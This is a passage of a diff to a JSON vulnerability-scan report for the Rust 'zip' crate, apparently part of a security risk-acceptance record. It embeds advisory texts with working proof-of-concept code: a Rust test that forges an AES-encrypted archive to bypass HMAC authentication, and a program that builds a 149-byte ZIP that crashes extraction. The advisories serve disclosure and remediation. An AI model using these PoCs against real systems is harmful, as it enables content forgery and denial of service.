+            "details": "### Summary\n\nAn AES-encrypted (AE-x) entry's authentication code is verified only when the reader's byte counter lands exactly on zero. If the bounded entry reader reaches the archive's actual EOF before the attacker-controlled, header-declared `compressed_size`, the counter remains positive, the HMAC is never read or compared, and the truncated, unauthenticated plaintext is returned as a clean end of stream. A zero-payload entry also returns before authentication. An attacker who does not know the password can modify an archive so chosen or modified plaintext is accepted with no error.\n\n### Details\n\n[`src/aes.rs:246-292`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/aes.rs#L246-L292):\n\n```rust\nfn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {\n    if self.data_remaining == 0 { // @audit insufficient check\n        return Ok(0);\n    }\n\n    // get the number of bytes to read, compare as u64 to make sure we can read more than\n    // 2^32 bytes even on 32 bit systems.\n    let bytes_to_read = self.data_remaining.min(buf.len() as u64) as usize;\n    let read = self.reader.read(&mut buf[0..bytes_to_read])?;\n    self.data_remaining -= read as u64;\n\n    // Update the hmac with the encrypted data\n    self.hmac.update(&buf[0..read]);\n\n    // decrypt the data\n    self.cipher.crypt_in_place(&mut buf[0..read]);\n\n    // if there is no data left to read, check the integrity of the data\n    if self.data_remaining == 0 {\n        debug_assert!(\n            !self.finalized,\n            \"Tried to use an already finalized HMAC. This is a bug!\"\n        );\n        if self.finalized {\n            return Err(Error::new(\n                ErrorKind::InvalidData,\n                \"Tried to use an already finalized HMAC\",\n            ));\n        }\n        self.finalized = true;\n\n        // Zip uses HMAC-Sha1-80, which only uses the first half of the hash\n        // see https://www.winzip.com/win/en/aes_info.html#auth-faq\n        let mut read_auth_code = [0; AUTH_CODE_LENGTH];\n        self.reader.read_exact(&mut read_auth_code)?;\n        let computed_auth_code = &self.hmac.finalize_reset().into_bytes()[0..AUTH_CODE_LENGTH];\n\n        // use constant time comparison to mitigate timing attacks\n        if !constant_time_eq(computed_auth_code, &read_auth_code) {\n            return Err(Error::new(\n                ErrorKind::InvalidData,\n                \"Invalid authentication code, this could be due to an invalid password or errors in the data\",\n            ));\n        }\n    }\n\n    Ok(read)\n}\n```\n\n`data_remaining` starts at `compressed_size - (2 + 10 + salt_length)` ([`src/aes.rs:144-145`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/aes.rs#L144-L145)), where `compressed_size` comes straight from the attacker-controlled central directory. Nothing cross-checks the declared data span against the archive's structural boundaries: `ZipFileData::find_content()` is just `reader.take(self.compressed_size)` ([`src/types.rs:214-223`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/types.rs#L214-L223)), and `make_crypto_reader()` passes the declared value into `AesReader::new()` ([`src/read/readers.rs`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/readers.rs#L219-L223)).\n\nWhen the entry's bounded reader reaches true EOF before the declared size, the inner reader returns `Ok(0)`, the subtraction takes away nothing, and the finalisation block — the only place the 10-byte HMAC-SHA1-80 tag is read and compared — never runs. If bytes such as the central directory follow the entry, they are consumed as payload until the `Take` limit is reached; the HMAC then usually fails. The bypass therefore requires true EOF at the premature end (as in the PoC) or the zero-payload case. The early return at the top of `read()` means an entry whose declared size leaves zero payload bytes is never authenticated either, even though its tag is present in the file.\n\nThis defeats the guarantee the type documents: *\"After the data has been read and decrypted an HMAC will be checked and provide a final means to check if either the password is invalid or if the data has been changed.\"*\n\nAE-2 entries skip the CRC-32 check by design ([`src/read/readers.rs`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/readers.rs#L248-L255) → `Crc32Reader::new(.., should_disable = true)`), so an AE-2 entry on this path has no integrity check of any kind remaining. AES-CTR is malleable, so an attacker who can modify an archive in transit — without the password — can XOR chosen plaintext onto the ciphertext and arrange for the entry to end at true EOF. The password-bearing read paths are affected, including `by_index_decrypt()`, `by_name_decrypt()`, `by_path_decrypt()`, and `by_index_with_options()` when a password is supplied. Bare `extract()` calls `by_index()` without a password and therefore rejects AES-encrypted entries; an application that decrypts entries through these APIs before writing or extracting them is affected.\n\n### PoC\n\n`tests/aes_hmac_bypass.rs` below; `Cargo.toml` needs only `zip = { git = \"https://github.com/zip-rs/zip2\", rev = \"6f09b3064ec87c3a69ea9f3413f9f9638b4aa446\" }`, or `zip = \"8.6.0\"` to run it against the published 8.6.0 release unchanged. All three tests pass in debug and release against the reviewed commit.\n\n```rust\nuse std::io::{Cursor, Read, Write};\nuse zip::write::SimpleFileOptions;\nuse zip::{AesMode, CompressionMethod, ZipArchive, ZipWriter};\n\nconst PASSWORD: [REDACTED] = \"correct horse battery staple\";\nconst GENUINE: &[u8] = b\"balance: 100 USD\\n\";\nconst FORGED: &[u8] = b\"balance: 999 USD\\n\";\nconst AES256_OVERHEAD: usize = 28; // 16-byte salt + 2-byte verifier + 10-byte tag\n\nfn genuine_archive(plaintext: &[u8]) -> Vec<u8> {\n    let mut w = ZipWriter::new(Cursor::new(Vec::new()));\n    let opts = SimpleFileOptions::default()\n        .compression_method(CompressionMethod::Stored)\n        .with_aes_encryption(AesMode::Aes256, PASSWORD);\n    w.start_file(\"secret.txt\", opts).unwrap();\n    w.write_all(plaintext).unwrap();\n    w.finish().unwrap().into_inner()\n}\n\n/// What a victim does: open with the correct password and read the entry.\nfn victim_reads(archive: &[u8]) -> std::io::Result<Vec<u8>> {\n    let mut a = ZipArchive::new(Cursor::new(archive.to_vec())).unwrap();\n    let mut f = a.by_index_decrypt(0, PASSWORD.as_bytes()).unwrap();\n    let mut out = Vec::new();\n    f.read_to_end(&mut out)?;\n    Ok(out)\n}\n\nfn u16le(b: &[u8], off: usize) -> usize {\n    u16::from_le_bytes([b[off], b[off + 1]]) as usize\n}\n\n/// Payload offset of the single local file header at offset 0.\nfn payload_start(a: &[u8]) -> usize {\n    30 + u16le(a, 26) + u16le(a, 28)\n}\n\n/// Control: on a well-formed archive the HMAC does reject forged ciphertext.\n#[test]\nfn tampering_is_detected_when_the_declared_size_is_honest() {\n    let mut a = genuine_archive(GENUINE);\n    let ct = payload_start(&a) + 18;\n    for i in 0..GENUINE.len() {\n        a[ct + i] ^= GENUINE[i] ^ FORGED[i]; // AES-CTR is malleable\n    }\n    let err = victim_reads(&a).unwrap_err();\n    assert!(err.to_string().contains(\"Invalid authentication code\"));\n}\n\n/// The bypass: chosen plaintext is delivered verbatim, without the password.\n#[test]\nfn hmac_is_bypassed_when_the_entry_ends_early() {\n    let genuine = genuine_archive(GENUINE);\n    let hdr_len = payload_start(&genuine);\n    let eocd = genuine.len() - 22; // no archive comment yet\n    let cd_offset = u32::from_le_bytes(genuine[eocd + 16..eocd + 20].try_into().unwrap()) as usize;\n\n    // Park a second copy of the entry after the end-of-central-directory record,\n    // inside the archive comment, so its data ends at true EOF. Header, salt and\n    // password verifier are copied verbatim — no password knowledge is required.\n    let mut evil = genuine.clone();\n    let new_hdr_offset = evil.len() as u32;\n    evil.extend_from_slice(&genuine[..hdr_len + 18]); // local header + salt + verifier\n    for i in 0..GENUINE.len() {\n        // XOR the keystream onto the chosen plaintext; the 10-byte tag is omitted.\n        evil.push(genuine[hdr_len + 18 + i] ^ GENUINE[i] ^ FORGED[i]);\n    }\n    let comment_len = (evil.len() - genuine.len()) as u16;\n    evil[eocd + 20..eocd + 22].copy_from_slice(&comment_len.to_le_bytes());\n\n    // Repoint the central directory at the parked copy and declare more data than\n    // is present, so `data_remaining` can never reach zero.\n    let declared = (AES256_OVERHEAD + GENUINE.len() + 64) as u32;\n    evil[cd_offset + 42..cd_offset + 46].copy_from_slice(&new_hdr_offset.to_le_bytes());\n    evil[cd_offset + 20..cd_offset + 24].copy_from_slice(&declared.to_le_bytes());\n    let hdr2 = new_hdr_offset as usize;\n    evil[hdr2 + 18..hdr2 + 22].copy_from_slice(&declared.to_le_bytes());\n\n    let content = victim_reads(&evil).expect(\"BUG: unauthenticated content was accepted\");\n    assert_eq!(content, FORGED);\n}\n\n/// Second path: an entry with no payload bytes is never authenticated at all.\n#[test]\nfn hmac_is_never_checked_for_a_zero_length_entry() {\n    let mut a = genuine_archive(b\"\");\n    let tag = payload_start(&a) + 18;\n    a[tag] ^= 0xff; // corrupt the 10-byte authentication code\n    let content = victim_reads(&a).expect(\"BUG: a corrupt authentication code was accepted\");\n    assert!(content.is_empty());\n}\n```\n\nTurning the genuine plaintext into a *chosen* plaintext needs the genuine plaintext, as always with CTR malleability; without it the attacker still controls arbitrary bit-flips in the delivered content.\n\n### Impact\n\nAny application that decrypts AES ZIP entries from untrusted or in-transit archives — backup restore, artefact and package ingestion, mail attachments, upload handling — can be served modified or attacker-chosen content by a party who does not hold the password, with no error surfaced by the affected read path. Exact chosen plaintext requires knowledge of the original plaintext, as with standard CTR malleability; otherwise the attacker can still induce arbitrary bit flips. Confidentiality is not affected and there is no memory-safety issue; the loss is the integrity guarantee that AE-x authenticated encryption exists to provide.\n\n### Suggested remediation\n\n1. In `AesReaderValid::read()`, treat a short inner read as an error rather than a clean EOF: after the decrement, if `read == 0 && self.data_remaining > 0`, return `ErrorKind::UnexpectedEof`.\n2. That alone is not enough — run the finalisation logic for zero-length entries too, either by dropping the early return and finalising once per reader, or by finalising at construction when `data_length == 0`.\n3. Defence in depth: validate that the declared compressed-data span is bounded by the archive's structural boundaries (in particular, the central-directory start when known) in `ZipFileData::find_content()` / `find_content_seek()` (`src/types.rs`). Also make the `compressed_size - overhead` subtraction in `AesReader::new()` (`src/aes.rs:144`) checked — today a declared size below the AES overhead underflows it, which panics under `overflow-checks` and, for sizes that still permit header validation, otherwise yields up to 9 bytes of unauthenticated plaintext through the same missing check.",
             "epss_scores": [
-              0.01622,
-              0.73572
+              0.00151,
+              0.04154
             ],
             "severity": "medium",
             "source": "github",
@@ -1015,14 +950,12 @@
           },
           {
             "cvss_scores": [
-              3.5,
-              5.3
+              6.5
             ],
             "cvss_vectors": [
-              "AV:N/AC:M/Au:S/C:N/I:N/A:P",
-              "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:H"
+              "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"
             ],
-            "details": "In Rust time crate from version 0.2.7 and before version 0.2.23, unix-like operating systems may segfault due to dereferencing a dangling pointer in specific circumstances. This requires the user to set any environment variable in a different thread than the affected functions. The affected functions are time::UtcOffset::local_offset_at, time::UtcOffset::try_local_offset_at, time::UtcOffset::current_local_offset, time::UtcOffset::try_current_local_offset, time::OffsetDateTime::now_local and time::OffsetDateTime::try_now_local. Non-Unix targets are unaffected. This includes Windows and wasm. The issue was introduced in version 0.2.7 and fixed in version 0.2.23. En el crate time de Rust desde la versión 0.2.7 y anterior a versión 0.2.23, los sistemas operativos tipo Unix pueden segregarse debido a la desreferenciación de un puntero colgante en circunstancias específicas.&#xa0;Esto requiere que el usuario configure cualquier variable de entorno en un hilo diferente al de las funciones afectadas.&#xa0;Las funciones afectadas son time::UtcOffset::local_offset_at, time::UtcOffset::try_local_offset_at, time::UtcOffset::current_local_offset, time::UtcOffset::try_current_local_offset, time::OffsetDateTime::now_local y time::OffsetDateTime::try_now_local.&#xa0;Los objetivos que no son Unix no están afectados.&#xa0;Esto incluye Windows y wasm.&#xa0;El problema se introdujo en la versión 0.2.7 y se corrigió en la versión 0.2.23",
+            "details": "zip is a zip library for Rust that supports reading and writing simple ZIP files. From 0.6.0 until 9.0.0, the AES entry reader in src/aes.rs verifies its HMAC only when the attacker-controlled data counter reaches zero. If the underlying bounded reader reaches the real end of the archive while data_remaining is still positive, or if an encrypted entry has no payload, the reader can return a clean end of stream without reading and comparing the authentication tag. Applications using by_index_decrypt, by_name_decrypt, by_path_decrypt, or password-enabled by_index_with_options can therefore accept modified plaintext without an authentication error. This issue is fixed in version 9.0.0.",
             "epss_scores": [],
             "severity": "medium",
             "source": "nvd",
@@ -1030,10 +963,10 @@
           },
           {
             "cvss_scores": [
-              6.2
+              6.5
             ],
             "cvss_vectors": [
-              "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+              "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"
             ],
             "details": "",
             "epss_scores": [],
@@ -1043,43 +976,632 @@
           }
         ],
         "fixed_versions": [
-          "0.2.0",
-          "0.2.1",
-          "0.2.2",
-          "0.2.23",
-          "0.2.3",
-          "0.2.4",
-          "0.2.5",
-          "0.2.6"
+          "9.0.0"
         ],
-        "id": "RUSTSEC-2020-0071",
-        "modified": "2026-03-13T22:01:10.372513Z",
+        "id": "GHSA-8HXF-QR8P-62X4",
+        "modified": "2026-10-29T17:00:04.188177718Z",
         "references": [
-          "https://crates.io/crates/time",
-          "https://crates.io/crates/time/0.2.23",
-          "https://github.com/advisories/GHSA-wcg3-cvx6-7396",
-          "https://github.com/time-rs/time",
-          "https://github.com/time-rs/time/issues/293",
-          "https://github.com/time-rs/time/security/advisories/GHSA-wcg3-cvx6-7396",
-          "https://nvd.nist.gov/vuln/detail/CVE-2020-26235",
-          "https://rustsec.org/advisories/RUSTSEC-2020-0071.html"
+          "https://github.com/advisories/GHSA-8hxf-qr8p-62x4",
+          "https://github.com/zip-rs/zip2",
+          "https://github.com/zip-rs/zip2/commit/ec265db0b0602f8ffb9479327397bddefb7e2216",
+          "https://github.com/zip-rs/zip2/releases/tag/v9.0.0",
+          "https://github.com/zip-rs/zip2/security/advisories/GHSA-8hxf-qr8p-62x4",
+          "https://nvd.nist.gov/vuln/detail/CVE-2026-115906"
         ],
         "severity": "medium",
+        "source": "osv",
+        "withdrawn": false
+      },
+      "kev": false,
+      "package": {
+        "bom_ref": null,
+        "direct": true,
+        "ecosystem": "crates.io",
+        "name": "zip",
+        "purl": "pkg:cargo/zip@6.0.0",
+        "scope": "runtime",
+        "version": "6.0.0"
+      },
+      "reachability": "unreachable",
+      "reachability_evidence": [
+        ".security/risk-acceptance/evidence/2026-11-cargo-reachability.txt#enabled-zip-features (aes-crypto is not enabled by either consumer)"
+      ]
+    },
+    {
+      "advisory": {
+        "affected_packages": [
+          {
+            "ecosystem": "crates.io",
+            "fixed_versions": [
+              "9.0.0"
+            ],
+            "name": "zip",
+            "purl": "pkg:cargo/zip@6.0.0",
+            "ranges": [
+              {
+                "events": [
+                  {
+                    "kind": "introduced",
+                    "value": "5.1.0"
+                  },
+                  {
+                    "kind": "fixed",
+                    "value": "9.0.0"
+                  }
+                ],
+                "repo": null,
+                "type": "SEMVER"
+              }
+            ],
+            "versions": []
+          }
+        ],
+        "affected_ranges": [
+          "fixed:9.0.0",
+          "introduced:5.1.0"
+        ],
+        "aliases": [
+          "CVE-2026-115907"
+        ],
+        "details": "### Summary\n\nA malicious 149-byte ZIP archive can cause a denial of service in applications that enable `legacy-zip` and use `ZipArchive::extract()`. An attacker-controlled ZIP64 uncompressed size triggers a `capacity overflow` panic in the Shrink decoder in optimized builds, potentially terminating the affected process.\n\n### Details\n\nWhen reading a Shrink-compressed entry, `ShrinkDecoder::read()` buffers the compressed input and reserves output capacity using the entry's declared uncompressed size:\n\n```rust\nif !self.stream_read {\n    self.stream_read = true;\n    let mut compressed_bytes = Vec::new();\n    self.compressed_reader.read_to_end(&mut compressed_bytes)?;\n    self.stream.reserve(self.uncompressed_size as usize);\n    hwunshrink(\n        &compressed_bytes,\n        self.uncompressed_size as usize,\n        &mut self.stream,\n    )?;\n}\n```\n\nIn version 8.6.0, this is located in [`src/legacy/shrink.rs`](https://github.com/zip-rs/zip2/blob/771dfc534d2614158af5497ea3dff4d4208d7db1/src/legacy/shrink.rs#L341-L352). The vulnerable legacy codecs are compiled when the `legacy-zip` Cargo feature is enabled.\n\n`self.uncompressed_size` is populated from ZIP metadata. For ZIP64 entries, an attacker can set it to a 64-bit value independently of the archive's actual compressed payload size. The PoC declares an uncompressed size of `u64::MAX`, while supplying only one byte of compressed data.\n\nThe reserve occurs before `hwunshrink()` can validate or decode the compressed stream. Consequently, the impossible capacity causes a deterministic `capacity overflow` panic instead of returning a normal archive or I/O error. The behavior also occurs in optimized release builds and is reachable through `ZipArchive::extract()`.\n\nThe same unbounded allocation pattern is present in the legacy Reduce and Implode decoder implementations. This PoC specifically demonstrates the Shrink path.\n\n### PoC\n\nCreate a new Cargo project with the following layout:\n\n```text\nzip2-legacy-poc/\n|-- Cargo.toml\n`-- src/\n    `-- main.rs\n```\n\nUse this `Cargo.toml`:\n\n```toml\n[package]\nname = \"zip2-legacy-poc\"\nversion = \"0.1.0\"\nedition = \"2024\"\npublish = false\n\n[dependencies]\ntempfile = \"3\"\nzip = { version = \"=8.6.0\", features = [\"legacy-zip\"] }\n```\n\nUse this `src/main.rs`:\n\n```rust\nuse std::fs::File;\nuse std::io::{Cursor, Write};\n\nfn push16(out: &mut Vec<u8>, value: u16) {\n    out.extend_from_slice(&value.to_le_bytes());\n}\n\nfn push32(out: &mut Vec<u8>, value: u32) {\n    out.extend_from_slice(&value.to_le_bytes());\n}\n\nfn push64(out: &mut Vec<u8>, value: u64) {\n    out.extend_from_slice(&value.to_le_bytes());\n}\n\nfn zip64_extra() -> Vec<u8> {\n    let mut extra = Vec::new();\n    push16(&mut extra, 0x0001);\n    push16(&mut extra, 16);\n    push64(&mut extra, u64::MAX);\n    push64(&mut extra, 1);\n    extra\n}\n\nfn archive() -> Vec<u8> {\n    let name = b\"entry\";\n    let extra = zip64_extra();\n    let mut out = Vec::new();\n\n    push32(&mut out, 0x0403_4b50);\n    push16(&mut out, 45);\n    push16(&mut out, 0);\n    push16(&mut out, 1); // Shrink compression.\n    push16(&mut out, 0);\n    push16(&mut out, 0);\n    push32(&mut out, 0);\n    push32(&mut out, u32::MAX);\n    push32(&mut out, u32::MAX);\n    push16(&mut out, name.len() as u16);\n    push16(&mut out, extra.len() as u16);\n    out.extend_from_slice(name);\n    out.extend_from_slice(&extra);\n    out.push(0);\n\n    let central_start = out.len() as u32;\n\n    push32(&mut out, 0x0201_4b50);\n    push16(&mut out, 45);\n    push16(&mut out, 45);\n    push16(&mut out, 0);\n    push16(&mut out, 1); // Shrink compression.\n    push16(&mut out, 0);\n    push16(&mut out, 0);\n    push32(&mut out, 0);\n    push32(&mut out, u32::MAX);\n    push32(&mut out, u32::MAX);\n    push16(&mut out, name.len() as u16);\n    push16(&mut out, extra.len() as u16);\n    push16(&mut out, 0);\n    push16(&mut out, 0);\n    push16(&mut out, 0);\n    push32(&mut out, 0);\n    push32(&mut out, 0);\n    out.extend_from_slice(name);\n    out.extend_from_slice(&extra);\n\n    let central_size = out.len() as u32 - central_start;\n\n    push32(&mut out, 0x0605_4b50);\n    push16(&mut out, 0);\n    push16(&mut out, 0);\n    push16(&mut out, 1);\n    push16(&mut out, 1);\n    push32(&mut out, central_size);\n    push32(&mut out, central_start);\n    push16(&mut out, 0);\n    out\n}\n\nfn main() -> Result<(), Box<dyn std::error::Error>> {\n    let bytes = archive();\n    File::create(\"poc.zip\")?.write_all(&bytes)?;\n\n    let mut archive = zip::ZipArchive::new(Cursor::new(bytes))?;\n    let entry = archive.by_index(0)?;\n\n    println!(\n        \"method={:?} declared_size={}\",\n        entry.compression(),\n        entry.size()\n    );\n\n    drop(entry);\n\n    let output = tempfile::tempdir()?;\n    archive.extract(output.path())?;\n    Ok(())\n}\n```\n\nRun the reproducer in release mode:\n\n```sh\ncd zip2-legacy-poc\nRUST_BACKTRACE=1 cargo run --release\n```\n\nObserved output with `zip` 8.6.0 on `x86_64-unknown-linux-gnu`:\n\n```text\nmethod=Shrink declared_size=18446744073709551615\n\nthread 'main' panicked at .../alloc/src/raw_vec/mod.rs:\ncapacity overflow\n```\n\nThe backtrace reaches the Shrink decompressor through `std::io::copy` and `ZipArchive::extract_internal()`. The process exits with status 101. The program also writes the generated 149-byte archive to `poc.zip` before triggering extraction.\n\n### Impact\n\nApplications that enable `legacy-zip` and pass attacker-supplied ZIP files to the following extraction API can be forced to panic before the compressed entry is validated or decoded. An unhandled panic may terminate the archive-processing process and cause a denial of service.\n\n- `zip::read::ZipArchive::extract`",
+        "enrichments": [
+          {
+            "cvss_scores": [
+              7.5
+            ],
+            "cvss_vectors": [
+              "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+            ],
+            "details": "### Summary\n\nA malicious 149-byte ZIP archive can cause a denial of service in applications that enable `legacy-zip` and use `ZipArchive::extract()`. An attacker-controlled ZIP64 uncompressed size triggers a `capacity overflow` panic in the Shrink decoder in optimized builds, potentially terminating the affected process.\n\n### Details\n\nWhen reading a Shrink-compressed entry, `ShrinkDecoder::read()` buffers the compressed input and reserves output capacity using the entry's declared uncompressed size:\n\n```rust\nif !self.stream_read {\n    self.stream_read = true;\n    let mut compressed_bytes = Vec::new();\n    self.compressed_reader.read_to_end(&mut compressed_bytes)?;\n    self.stream.reserve(self.uncompressed_size as usize);\n    hwunshrink(\n        &compressed_bytes,\n        self.uncompressed_size as usize,\n        &mut self.stream,\n    )?;\n}\n```\n\nIn version 8.6.0, this is located in [`src/legacy/shrink.rs`](https://github.com/zip-rs/zip2/blob/771dfc534d2614158af5497ea3dff4d4208d7db1/src/legacy/shrink.rs#L341-L352). The vulnerable legacy codecs are compiled when the `legacy-zip` Cargo feature is enabled.\n\n`self.uncompressed_size` is populated from ZIP metadata. For ZIP64 entries, an attacker can set it to a 64-bit value independently of the archive's actual compressed payload size. The PoC declares an uncompressed size of `u64::MAX`, while supplying only one byte of compressed data.\n\nThe reserve occurs before `hwunshrink()` can validate or decode the compressed stream. Consequently, the impossible capacity causes a deterministic `capacity overflow` panic instead of returning a normal archive or I/O error. The behavior also occurs in optimized release builds and is reachable through `ZipArchive::extract()`.\n\nThe same unbounded allocation pattern is present in the legacy Reduce and Implode decoder implementations. This PoC specifically demonstrates the Shrink path.\n\n### PoC\n\nCreate a new Cargo project with the following layout:\n\n```text\nzip2-legacy-poc/\n|-- Cargo.toml\n`-- src/\n    `-- main.rs\n```\n\nUse this `Cargo.toml`:\n\n```toml\n[package]\nname = \"zip2-legacy-poc\"\nversion = \"0.1.0\"\nedition = \"2024\"\npublish = false\n\n[dependencies]\ntempfile = \"3\"\nzip = { version = \"=8.6.0\", features = [\"legacy-zip\"] }\n```\n\nUse this `src/main.rs`:\n\n```rust\nuse std::fs::File;\nuse std::io::{Cursor, Write};\n\nfn push16(out: &mut Vec<u8>, value: u16) {\n    out.extend_from_slice(&value.to_le_bytes());\n}\n\nfn push32(out: &mut Vec<u8>, value: u32) {\n    out.extend_from_slice(&value.to_le_bytes());\n}\n\nfn push64(out: &mut Vec<u8>, value: u64) {\n    out.extend_from_slice(&value.to_le_bytes());\n}\n\nfn zip64_extra() -> Vec<u8> {\n    let mut extra = Vec::new();\n    push16(&mut extra, 0x0001);\n    push16(&mut extra, 16);\n    push64(&mut extra, u64::MAX);\n    push64(&mut extra, 1);\n    extra\n}\n\nfn archive() -> Vec<u8> {\n    let name = b\"entry\";\n    let extra = zip64_extra();\n    let mut out = Vec::new();\n\n    push32(&mut out, 0x0403_4b50);\n    push16(&mut out, 45);\n    push16(&mut out, 0);\n    push16(&mut out, 1); // Shrink compression.\n    push16(&mut out, 0);\n    push16(&mut out, 0);\n    push32(&mut out, 0);\n    push32(&mut out, u32::MAX);\n    push32(&mut out, u32::MAX);\n    push16(&mut out, name.len() as u16);\n    push16(&mut out, extra.len() as u16);\n    out.extend_from_slice(name);\n    out.extend_from_slice(&extra);\n    out.push(0);\n\n    let central_start = out.len() as u32;\n\n    push32(&mut out, 0x0201_4b50);\n    push16(&mut out, 45);\n    push16(&mut out, 45);\n    push16(&mut out, 0);\n    push16(&mut out, 1); // Shrink compression.\n    push16(&mut out, 0);\n    push16(&mut out, 0);\n    push32(&mut out, 0);\n    push32(&mut out, u32::MAX);\n    push32(&mut out, u32::MAX);\n    push16(&mut out, name.len() as u16);\n    push16(&mut out, extra.len() as u16);\n    push16(&mut out, 0);\n    push16(&mut out, 0);\n    push16(&mut out, 0);\n    push32(&mut out, 0);\n    push32(&mut out, 0);\n    out.extend_from_slice(name);\n    out.extend_from_slice(&extra);\n\n    let central_size = out.len() as u32 - central_start;\n\n    push32(&mut out, 0x0605_4b50);\n    push16(&mut out, 0);\n    push16(&mut out, 0);\n    push16(&mut out, 1);\n    push16(&mut out, 1);\n    push32(&mut out, central_size);\n    push32(&mut out, central_start);\n    push16(&mut out, 0);\n    out\n}\n\nfn main() -> Result<(), Box<dyn std::error::Error>> {\n    let bytes = archive();\n    File::create(\"poc.zip\")?.write_all(&bytes)?;\n\n    let mut archive = zip::ZipArchive::new(Cursor::new(bytes))?;\n    let entry = archive.by_index(0)?;\n\n    println!(\n        \"method={:?} declared_size={}\",\n        entry.compression(),\n        entry.size()\n    );\n\n    drop(entry);\n\n    let output = tempfile::tempdir()?;\n    archive.extract(output.path())?;\n    Ok(())\n}\n```\n\nRun the reproducer in release mode:\n\n```sh\ncd zip2-legacy-poc\nRUST_BACKTRACE=1 cargo run --release\n```\n\nObserved output with `zip` 8.6.0 on `x86_64-unknown-linux-gnu`:\n\n```text\nmethod=Shrink declared_size=18446744073709551615\n\nthread 'main' panicked at .../alloc/src/raw_vec/mod.rs:\ncapacity overflow\n```\n\nThe backtrace reaches the Shrink decompressor through `std::io::copy` and `ZipArchive::extract_internal()`. The process exits with status 101. The program also writes the generated 149-byte archive to `poc.zip` before triggering extraction.\n\n### Impact\n\nApplications that enable `legacy-zip` and pass attacker-supplied ZIP files to the following extraction API can be forced to panic before the compressed entry is validated or decoded. An unhandled panic may terminate the archive-processing process and cause a denial of service.\n\n- `zip::read::ZipArchive::extract`",
+            "epss_scores": [
+              0.0035,
+              0.285
+            ],
+            "severity": "high",
+            "source": "github",
+            "vulnerable_functions": []
+          },
+          {
+            "cvss_scores": [
+              7.5
+            ],
+            "cvss_vectors": [
+              "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+            ],
+            "details": "zip is a zip library for Rust that supports reading and writing simple ZIP files. From 5.1.0 until 9.0.0, applications built with the legacy-zip feature can reserve output capacity from an attacker-controlled ZIP64 uncompressed size before validating the compressed stream. The ShrinkDecoder path in src/legacy/shrink.rs can panic with a capacity overflow during ZipArchive::extract, and the Reduce and Implode decoders contain the same unbounded preallocation pattern. An unhandled panic can terminate an archive-processing service. This issue is fixed in version 9.0.0.",
+            "epss_scores": [],
+            "severity": "high",
+            "source": "nvd",
+            "vulnerable_functions": []
+          },
+          {
+            "cvss_scores": [
+              7.5
+            ],
+            "cvss_vectors": [
+              "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+            ],
+            "details": "",
+            "epss_scores": [],
+            "severity": "high",
+            "source": "osv",
+            "vulnerable_functions": []
+          }
+        ],
+        "fixed_versions": [
+          "9.0.0"
+        ],
+        "id": "GHSA-9HJ8-73FH-9963",
+        "modified": "2026-10-29T17:00:04.177534981Z",
+        "references": [
+          "https://github.com/advisories/GHSA-9hj8-73fh-9963",
+          "https://github.com/zip-rs/zip2",
+          "https://github.com/zip-rs/zip2/commit/8b4991288b79ad11cce201c2d785d5baa795bd3e",
+          "https://github.com/zip-rs/zip2/pull/991",
+          "https://github.com/zip-rs/zip2/releases/tag/v9.0.0",
+          "https://github.com/zip-rs/zip2/security/advisories/GHSA-9hj8-73fh-9963",
+          "https://nvd.nist.gov/vuln/detail/CVE-2026-115907"
+        ],
+        "severity": "high",
+        "source": "osv",
+        "withdrawn": false
+      },
+      "kev": false,
+      "package": {
+        "bom_ref": null,
+        "direct": true,
+        "ecosystem": "crates.io",
+        "name": "zip",
+        "purl": "pkg:cargo/zip@6.0.0",
+        "scope": "runtime",
+        "version": "6.0.0"
+      },
+      "reachability": "unreachable",
+      "reachability_evidence": [
+        ".security/risk-acceptance/evidence/2026-11-cargo-reachability.txt#enabled-zip-features (legacy-zip is not enabled; no extract() call site)"
+      ]
+    },
+    {
+      "advisory": {
+        "affected_packages": [
+          {
+            "ecosystem": "crates.io",
+            "fixed_versions": [
+              "9.0.5"
+            ],
+            "name": "zip",
+            "purl": "pkg:cargo/zip@6.0.0",
+            "ranges": [
+              {
+                "events": [
+                  {
+                    "kind": "introduced",
+                    "value": "0"
+                  },
+                  {
+                    "kind": "fixed",
+                    "value": "9.0.5"
+                  }
+                ],
+                "repo": null,
+                "type": "SEMVER"
+              }
+            ],
+            "versions": []
+          }
+        ],
+        "affected_ranges": [
+          "fixed:9.0.5",
+          "introduced:0"
+        ],
+        "aliases": [
+          "CVE-2026-115905"
+        ],
+        "details": "## Summary\nA critical architectural parser differential exists in the `zip` crate (`<= 9.0.4`) between random-access archive readers (`ZipArchive`) and streaming readers (`ZipStreamReader`). `ZipArchive` considers the Central Directory File Header (CDFH) authoritative and ignores the filename declared in the Local File Header (LFH). In contrast, `ZipStreamReader` relies exclusively on the Local File Header (LFH) when extracting files to the filesystem.\n\nThis discrepancy enables ZIP archives to appear to have different file paths and contents according to which tool is reading them.\n\n---\n\n## Details\n\n### Architectural Root Cause\nIn the PKWARE ZIP archive format, every file entry is defined in two distinct locations:\n1. **Local File Header (LFH):** Precedes the compressed payload of each file in the body of the archive.\n2. **Central Directory File Header (CDFH):** Stored in a contiguous index at the end of the archive.\n\nIn `zip2`:\n- `src/read/zip_archive.rs`: `ZipArchive` parses the central directory into `SharedBuilder.files`. All file lookups by index or name read exclusively from the CDFH table, completely ignoring the filename present in the LFH.\n- `src/read/stream.rs:L86-L141`: `ZipStreamReader::visit` and `ZipStreamReader::extract` read sequentially from the stream without verifying the central directory index. Each entry is parsed via `read_zipfile_from_stream` and written to disk using the unverified filename declared in the LFH:\n  